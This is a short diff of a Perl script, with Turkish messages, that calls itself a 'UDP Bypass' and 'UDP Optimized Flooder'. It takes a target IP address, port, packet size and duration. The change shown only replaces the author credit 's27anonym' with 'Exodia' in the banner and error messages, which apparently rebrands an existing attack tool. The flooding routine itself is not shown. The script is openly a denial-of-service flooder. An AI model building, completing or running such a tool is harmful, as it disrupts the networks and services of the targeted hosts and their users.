@@ -16,15 +16,15 @@ our $bw   = 0;
 our $help = 0;
 our $delay= 0;
 our $ipv6 = 0;
-print BOLD WHITE "S27anonym - UDP Bypass [+] Kullanım <IP Adresi> <Port> <Paket> <Zaman>  \n";
-print RED "s27anonym - UDP Bypass [+] Bu script s27anonym tarafından yapılmıştır. \n";
+print BOLD WHITE "Exodia - UDP Bypass [+] Kullanım <IP Adresi> <Port> <Paket> <Zaman>  \n";
+print RED "Exodia - UDP Bypass [+] Bu script Exodia tarafından yapılmıştır. \n";
 print BOLD BLACK  "     \n";
 
 my ($ip,$port,$size,$time) = @ARGV;
 
 my ($iaddr,$endtime,$count);
 
-$iaddr = inet_aton("$ip") or die "Hedef IP adresi yanlış veya bulunamadı. - s27anonym UDP Optimized Flooder  $ip \n";
+$iaddr = inet_aton("$ip") or die "Hedef IP adresi yanlış veya bulunamadı. - Exodia UDP Optimized Flooder  $ip \n";
 
 $endtime = time() + $time;
 
